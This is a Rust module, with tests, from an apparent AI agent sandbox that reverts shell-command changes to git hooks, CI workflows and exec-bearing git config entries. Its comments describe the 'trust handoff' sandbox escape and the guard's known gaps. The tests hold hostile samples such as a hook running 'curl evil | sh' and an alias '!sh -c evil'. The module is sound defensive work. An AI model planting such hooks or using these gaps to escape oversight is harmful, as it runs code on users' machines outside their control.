//! A shell command may not change a file a host tool executes on reading it.
//!
//! # Why the executor, and why after the fact
//!
//! The file sandbox asks for an approval before a write to an
//! [`portcullis::EXECUTE_ON_CONSUME`] path. A shell command never reaches the
//! file sandbox: `echo … > .git/hooks/pre-commit` is one `RunBash` decision about
//! a command string, and the process then writes wherever its filesystem allows.
//! That is the "trust handoff" escape — the agent writes a file the policy
//! allowed, and an unsandboxed host tool runs it later — in its purest form,
//! and the one argument-level mediation cannot see.
//!
//! So both spawn paths snapshot every such file before the child runs and
//! compare after it exits. A change is reverted and the command is refused,
//! naming the paths; the way to make that change is the write tool, which asks
//! for the approval. The check runs whether the command succeeded, failed or
//! timed out, because a command can write and then fail.
//!
//! # `.git/config` is compared by what it can execute
//!
//! `git init`, `git clone` and `git remote add` write it, and reverting those
//! would break ordinary work. Only its exec-bearing entries (`core.fsmonitor`,
//! `core.hooksPath`, `alias.*`, filter and diff drivers, `credential.helper`,
//! `include.path`, …) are compared, and only entries the command ADDED are
//! stripped; every other edit stays.
//!
//! Which keys are exec-bearing, which files are git configs and which are
//! hooks is [`portcullis::git_exec`]'s to say, not this module's: the
//! pre-mount workspace scan reads the same list (ADR 0013, ADR 0007 G-1), so a
//! key added there is guarded here and scanned there at once.
//!
//! # What this does not catch
//!
//! A process the command leaves running in the background can write after the
//! check. `node_modules/` anywhere and `target/` at the root are not walked
//! (package code is not this list's subject, and both can be enormous), and a
//! file over [`MAX_FILE_BYTES`] is kept as a digest, so a change to one cannot
//! be undone and the changed file is removed instead.

use std::collections::{BTreeMap, BTreeSet};
use std::io;
use std::path::{Path, PathBuf};

use cap_std::fs::Dir;
use portcullis::git_exec::{self, is_git_config};
use sha2::{Digest, Sha256};

use crate::{NucleusError, Result};

/// Directory entries walked before the guard gives up. Past this it cannot say
/// what it would be comparing, so the command is refused before it runs:
/// "could not look" is not "looked and it was fine" (ADR 0007 A).
pub const MAX_ENTRIES: usize = 250_000;
/// Files above this are kept as a digest rather than as bytes.
pub const MAX_FILE_BYTES: u64 = 8 << 20;
/// Bytes kept across one snapshot; past it, files are kept as digests.
const MAX_TOTAL_BYTES: u64 = 64 << 20;

/// What a snapshot holds for one path.
#[derive(Debug, Clone, PartialEq, Eq)]
enum Content {
    Bytes {
        bytes: Vec<u8>,
        mode: u32,
    },
    Link(PathBuf),
    /// Too large to keep; changes are detected, not undone.
    Digest {
        sha256: [u8; 32],
        mode: u32,
    },
}

/// What the guard did to one path.
#[derive(Debug, Clone, PartialEq, Eq)]
pub enum Action {
    /// The file was put back as it was.
    Restored,
    /// The command created it; it was removed.
    Removed,
    /// It was too large to keep, so the changed file was removed.
    RemovedUnrestorable,
    /// Git config: these entries the command added were stripped.
    StrippedEntries(Vec<String>),
}

/// One reverted path and why it was watched.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct Reverted {
    /// The workspace-relative path.
    pub path: String,
    /// The `EXECUTE_ON_CONSUME` glob it matched, or the git-config rule.
    pub rule: &'static str,
    /// What was done to it.
    pub action: Action,
}

/// The watched files under a sandbox root, as they were.
#[derive(Debug, Default)]
pub struct Snapshot {
    files: BTreeMap<String, Content>,
    /// Git configs, by path, with their exec-bearing entries.
    git_configs: BTreeMap<String, BTreeSet<String>>,
}

#[cfg(unix)]
fn mode_of(meta: &cap_std::fs::Metadata) -> u32 {
    use cap_std::fs::PermissionsExt;
    meta.permissions().mode()
}
#[cfg(not(unix))]
fn mode_of(_meta: &cap_std::fs::Metadata) -> u32 {
    0
}

/// Every watched path under `root`: `(relative path, is git config)`.
fn watched(root: &Dir) -> Result<Vec<String>> {
    let mut out = Vec::new();
    let mut seen = 0usize;
    let mut stack: Vec<PathBuf> = vec![PathBuf::new()];
    while let Some(dir) = stack.pop() {
        let entries = if dir.as_os_str().is_empty() {
            root.entries()
        } else {
            root.read_dir(&dir)
        }
        .map_err(NucleusError::Io)?;
        for entry in entries {
            seen += 1;
            if seen > MAX_ENTRIES {
                return Err(NucleusError::CommandDenied {
                    command: String::new(),
                    reason: format!(
                        "the workspace has more than {MAX_ENTRIES} entries, so the \
                         execute-on-consume guard cannot see what this command would change; \
                         refused before it ran"
                    ),
                });
            }
            let entry = entry.map_err(NucleusError::Io)?;
            let name = entry.file_name();
            let rel = dir.join(&name);
            let rel_str = rel.to_string_lossy().replace('\\', "/");
            let kind = entry.file_type().map_err(NucleusError::Io)?;
            if kind.is_dir() {
                let n = name.to_string_lossy();
                let prune = n == "node_modules"
                    || (dir.as_os_str().is_empty() && n == "target")
                    || git_exec::is_git_data_dir(&rel_str);
                if !prune {
                    stack.push(rel);
                }
            } else if rule_for(&rel_str).is_some() {
                out.push(rel_str);
            }
        }
    }
    out.sort();
    Ok(out)
}

/// The exec-bearing entries of a git config, as `section[.sub].key=value`.
///
/// Every key here makes git run a command it names: on a fetch, a diff, a
/// checkout, a status, or a credential prompt.
pub fn exec_entries(text: &str) -> BTreeSet<String> {
    git_exec::config_entries(text)
        .into_iter()
        .filter_map(|l| l.exec.map(|_| l.entry))
        .collect()
}

/// Why `rel` is watched: the [`portcullis::EXECUTE_ON_CONSUME`] glob it
/// matches, a git hook (a submodule's, under `.git/modules/`, which no glob
/// names), or a git config, compared by its exec-bearing keys. `None`: not
/// watched.
fn rule_for(rel: &str) -> Option<&'static str> {
    portcullis::executes_on_consume(rel)
        .or_else(|| git_exec::is_git_hook(rel).then_some("git hook"))
        .or_else(|| is_git_config(rel).then_some("git config"))
}

/// `text` without the exec-bearing entries `keep` does not contain.
fn strip_new_exec(text: &str, keep: &BTreeSet<String>) -> (String, Vec<String>) {
    let lines: Vec<&str> = text.lines().collect();
    let mut drop = vec![false; lines.len()];
    let mut stripped = Vec::new();
    for l in git_exec::config_entries(text) {
        if l.exec.is_some() && !keep.contains(&l.entry) {
            for i in l.lines.clone() {
                drop[i] = true;
            }
            stripped.push(l.entry);
        }
    }
    let mut out: String = lines
        .iter()
        .zip(&drop)
        .filter(|(_, d)| !**d)
        .map(|(l, _)| format!("{l}\n"))
        .collect();
    if !text.ends_with('\n') && out.ends_with('\n') {
        out.pop();
    }
    (out, stripped)
}

impl Snapshot {
    /// Record every watched file under `root`.
    pub fn take(root: &Dir) -> Result<Self> {
        let mut snap = Snapshot::default();
        let mut kept = 0u64;
        for rel in watched(root)? {
            let meta = root.symlink_metadata(&rel).map_err(NucleusError::Io)?;
            if is_git_config(&rel) && meta.is_file() {
                let text = root.read_to_string(&rel).unwrap_or_default();
                snap.git_configs.insert(rel, exec_entries(&text));
                continue;
            }
            let content = read_content(root, &rel, &meta, &mut kept)?;
            snap.files.insert(rel, content);
        }
        Ok(snap)
    }

    /// Compare `root` with this snapshot and undo every change. Returns what
    /// was undone; empty means the command touched nothing watched.
    pub fn revert_changes(&self, root: &Dir) -> Result<Vec<Reverted>> {
        let mut out = Vec::new();
        let now = watched(root)?;
        let now_set: BTreeSet<&String> = now.iter().collect();
        let mut kept = 0u64;

        for rel in &now {
            let meta = root.symlink_metadata(rel).map_err(NucleusError::Io)?;
            if is_git_config(rel) && meta.is_file() {
                let text = root.read_to_string(rel).unwrap_or_default();
                let empty = BTreeSet::new();
                let before = self.git_configs.get(rel).unwrap_or(&empty);
                if exec_entries(&text).is_subset(before) {
                    continue;
                }
                let (clean, stripped) = strip_new_exec(&text, before);
                root.write(rel, clean).map_err(NucleusError::Io)?;
                out.push(Reverted {
                    path: rel.clone(),
                    rule: "git config: exec-bearing entry",
                    action: Action::StrippedEntries(stripped),
                });
                continue;
            }
            let rule = rule_for(rel).unwrap_or("git config");
            let current = read_content(root, rel, &meta, &mut kept)?;
            match self.files.get(rel) {
                Some(before) if same(before, &current) => {}
                Some(before) => {
                    let action = restore(root, rel, before)?;
                    out.push(Reverted {
                        path: rel.clone(),
                        rule,
                        action,
                    });
                }
                None => {
                    remove(root, rel)?;
                    out.push(Reverted {
                        path: rel.clone(),
                        rule,
                        action: Action::Removed,
                    });
                }
            }
        }
        for (rel, before) in &self.files {
            if !now_set.contains(rel) {
                let rule = rule_for(rel).unwrap_or("git config");
                let action = restore(root, rel, before)?;
                out.push(Reverted {
                    path: rel.clone(),
                    rule,
                    action,
                });
            }
        }
        Ok(out)
    }
}

/// Equal as far as a host tool could tell. A digest compares against bytes by
/// hashing them.
fn same(a: &Content, b: &Content) -> bool {
    let digest = |c: &Content| match c {
        Content::Bytes { bytes, mode } => Some((Sha256::digest(bytes).into(), *mode)),
        Content::Digest { sha256, mode } => Some((*sha256, *mode)),
        Content::Link(_) => None,
    };
    match (a, b) {
        (Content::Link(x), Content::Link(y)) => x == y,
        _ => {
            let (x, y): (Option<([u8; 32], u32)>, _) = (digest(a), digest(b));
            x.is_some() && x == y
        }
    }
}

fn read_content(
    root: &Dir,
    rel: &str,
    meta: &cap_std::fs::Metadata,
    kept: &mut u64,
) -> Result<Content> {
    if meta.file_type().is_symlink() {
        return root
            .read_link_contents(rel)
            .map(Content::Link)
            .map_err(NucleusError::Io);
    }
    let mode = mode_of(meta);
    let bytes = root.read(rel).map_err(NucleusError::Io)?;
    let len = bytes.len() as u64;
    if len > MAX_FILE_BYTES || *kept + len > MAX_TOTAL_BYTES {
        return Ok(Content::Digest {
            sha256: Sha256::digest(&bytes).into(),
            mode,
        });
    }
    *kept += len;
    Ok(Content::Bytes { bytes, mode })
}

fn remove(root: &Dir, rel: &str) -> Result<()> {
    match root.remove_file(rel) {
        Ok(()) => Ok(()),
        Err(e) if e.kind() == io::ErrorKind::NotFound => Ok(()),
        Err(e) => Err(NucleusError::Io(e)),
    }
}

fn restore(root: &Dir, rel: &str, before: &Content) -> Result<Action> {
    remove(root, rel)?;
    if let Some(parent) = Path::new(rel).parent()
        && !parent.as_os_str().is_empty()
    {
        root.create_dir_all(parent).map_err(NucleusError::Io)?;
    }
    match before {
        Content::Bytes { bytes, mode } => {
            root.write(rel, bytes).map_err(NucleusError::Io)?;
            set_mode(root, rel, *mode)?;
            Ok(Action::Restored)
        }
        Content::Link(target) => {
            #[cfg(not(windows))]
            {
                root.symlink_contents(target, rel)
                    .map_err(NucleusError::Io)?;
                Ok(Action::Restored)
            }
            #[cfg(windows)]
            {
                let _ = target;
                Ok(Action::RemovedUnrestorable)
            }
        }
        Content::Digest { .. } => Ok(Action::RemovedUnrestorable),
    }
}

#[cfg(unix)]
fn set_mode(root: &Dir, rel: &str, mode: u32) -> Result<()> {
    use cap_std::fs::{Permissions, PermissionsExt};
    root.set_permissions(rel, Permissions::from_mode(mode))
        .map_err(NucleusError::Io)
}
#[cfg(not(unix))]
fn set_mode(_root: &Dir, _rel: &str, _mode: u32) -> Result<()> {
    Ok(())
}

/// The refusal a command gets when it changed watched files.
pub fn refusal(command: &str, reverted: &[Reverted]) -> NucleusError {
    let list = reverted
        .iter()
        .map(|r| format!("{} ({}; {:?})", r.path, r.rule, r.action))
        .collect::<Vec<_>>()
        .join(", ");
    NucleusError::CommandDenied {
        command: command.to_string(),
        reason: format!(
            "it changed files a host tool executes on reading them, and those changes were \
             reverted: {list}. Make such a change with the write tool, which asks for an \
             approval naming the path"
        ),
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use cap_std::ambient_authority;

    fn root() -> (tempfile::TempDir, Dir) {
        let tmp = tempfile::tempdir().unwrap();
        let dir = Dir::open_ambient_dir(tmp.path(), ambient_authority()).unwrap();
        (tmp, dir)
    }

    #[test]
    fn a_new_hook_is_removed_and_ordinary_files_are_left_alone() {
        let (_t, d) = root();
        d.create_dir_all(".git/hooks").unwrap();
        d.write(".git/hooks/pre-commit.sample", "inert").unwrap();
        let snap = Snapshot::take(&d).unwrap();

        d.write(".git/hooks/pre-commit", "curl evil | sh").unwrap();
        d.write("src.rs", "fn main() {}").unwrap();
        d.write(".git/hooks/post-merge.sample", "still inert")
            .unwrap();

        let r = snap.revert_changes(&d).unwrap();
        assert_eq!(r.len(), 1, "{r:?}");
        assert_eq!(r[0].path, ".git/hooks/pre-commit");
        assert_eq!(r[0].action, Action::Removed);
        assert!(!d.exists(".git/hooks/pre-commit"));
        assert!(d.exists("src.rs"), "the control: ordinary work survives");
    }

    #[test]
    fn a_modified_workflow_is_restored_and_a_deleted_one_comes_back() {
        let (_t, d) = root();
        d.create_dir_all(".github/workflows").unwrap();
        d.write(".github/workflows/ci.yml", "on: push").unwrap();
        d.write(".github/workflows/release.yml", "on: tag").unwrap();
        let snap = Snapshot::take(&d).unwrap();

        d.write(".github/workflows/ci.yml", "on: push\nrun: exfil")
            .unwrap();
        d.remove_file(".github/workflows/release.yml").unwrap();

        let r = snap.revert_changes(&d).unwrap();
        assert_eq!(r.len(), 2, "{r:?}");
        assert_eq!(
            d.read_to_string(".github/workflows/ci.yml").unwrap(),
            "on: push"
        );
        assert_eq!(
            d.read_to_string(".github/workflows/release.yml").unwrap(),
            "on: tag"
        );
    }

    #[cfg(unix)]
    #[test]
    fn making_an_existing_file_executable_is_a_change() {
        use cap_std::fs::{Permissions, PermissionsExt};
        let (_t, d) = root();
        d.write(".envrc", "export X=1").unwrap();
        d.set_permissions(".envrc", Permissions::from_mode(0o644))
            .unwrap();
        let snap = Snapshot::take(&d).unwrap();
        d.set_permissions(".envrc", Permissions::from_mode(0o755))
            .unwrap();
        let r = snap.revert_changes(&d).unwrap();
        assert_eq!(r.len(), 1, "{r:?}");
        let mode = d.symlink_metadata(".envrc").unwrap().permissions().mode();
        assert_eq!(mode & 0o777, 0o644);
    }

    #[test]
    fn a_git_config_keeps_ordinary_edits_and_loses_only_new_exec_entries() {
        let (_t, d) = root();
        d.create_dir_all(".git").unwrap();
        d.write(".git/config", "[core]\n\tbare = false\n").unwrap();
        let snap = Snapshot::take(&d).unwrap();

        d.write(
            ".git/config",
            "[core]\n\tbare = false\n\tfsmonitor = ./x.sh\n[remote \"origin\"]\n\turl = https://example.invalid/r.git\n[alias]\n\tst = !sh -c evil\n",
        )
        .unwrap();
        let r = snap.revert_changes(&d).unwrap();
        assert_eq!(r.len(), 1, "{r:?}");
        let after = d.read_to_string(".git/config").unwrap();
        assert!(!after.contains("fsmonitor"), "{after}");
        assert!(!after.contains("evil"), "{after}");
        assert!(
            after.contains("url = https://example.invalid/r.git"),
            "{after}"
        );
        match &r[0].action {
            Action::StrippedEntries(e) => assert_eq!(e.len(), 2, "{e:?}"),
            other => panic!("{other:?}"),
        }
    }

    #[test]
    fn every_key_of_the_shared_list_is_stripped_when_a_command_adds_it() {
        // Keys the guard did not know before the list moved to
        // `portcullis::git_exec`; reading the shared list is what guards them.
        for added in [
            "[core]\n\talternateRefsCommand = ./x.sh\n",
            "[interactive]\n\tdiffFilter = ./x.sh\n",
            "[hook \"x\"]\n\tcommand = ./x.sh\n",
            "[submodule \"s\"]\n\tupdate = !./x.sh\n",
        ] {
            let (_t, d) = root();
            d.create_dir_all(".git").unwrap();
            d.write(".git/config", "[core]\n\tbare = false\n").unwrap();
            let snap = Snapshot::take(&d).unwrap();
            d.write(".git/config", format!("[core]\n\tbare = false\n{added}"))
                .unwrap();
            let r = snap.revert_changes(&d).unwrap();
            assert_eq!(r.len(), 1, "{added}: {r:?}");
            assert!(
                !d.read_to_string(".git/config").unwrap().contains("x.sh"),
                "{added}"
            );
        }
    }

    #[test]
    fn a_new_submodule_hook_is_removed() {
        let (_t, d) = root();
        d.create_dir_all(".git/modules/lib/hooks").unwrap();
        let snap = Snapshot::take(&d).unwrap();
        d.write(".git/modules/lib/hooks/post-checkout", "evil")
            .unwrap();
        let r = snap.revert_changes(&d).unwrap();
        assert_eq!(r.len(), 1, "{r:?}");
        assert_eq!(r[0].rule, "git hook");
        assert!(!d.exists(".git/modules/lib/hooks/post-checkout"));
    }

    #[test]
    fn a_fresh_git_init_is_not_a_change() {
        let (_t, d) = root();
        let snap = Snapshot::take(&d).unwrap();
        d.create_dir_all(".git/hooks").unwrap();
        d.write(".git/config", "[core]\n\trepositoryformatversion = 0\n")
            .unwrap();
        d.write(".git/hooks/pre-push.sample", "#!/bin/sh").unwrap();
        assert!(snap.revert_changes(&d).unwrap().is_empty());
    }

    #[test]
    fn a_gitlink_file_is_watched_but_a_git_directory_is_not_a_file_change() {
        let (_t, d) = root();
        d.create_dir_all("vendor/lib").unwrap();
        let snap = Snapshot::take(&d).unwrap();
        d.write("vendor/lib/.git", "gitdir: /tmp/evil").unwrap();
        let r = snap.revert_changes(&d).unwrap();
        assert_eq!(r.len(), 1, "{r:?}");
        assert!(!d.exists("vendor/lib/.git"));
    }

    #[test]
    fn exec_entries_read_sections_subsections_and_continuations() {
        let text = "[filter \"lfs\"]\n\tsmudge = git-lfs smudge\n[diff]\n\texternal = x\n[user]\n\tname = a\n[includeIf \"gitdir:~/\"]\n\tpath = b\n";
        let e = exec_entries(text);
        assert!(e.contains("filter.lfs.smudge=git-lfs smudge"), "{e:?}");
        assert!(e.contains("diff.external=x"), "{e:?}");
        assert!(e.contains("includeif.gitdir:~/.path=b"), "{e:?}");
        assert!(!e.iter().any(|x| x.starts_with("user.")), "{e:?}");
    }
}
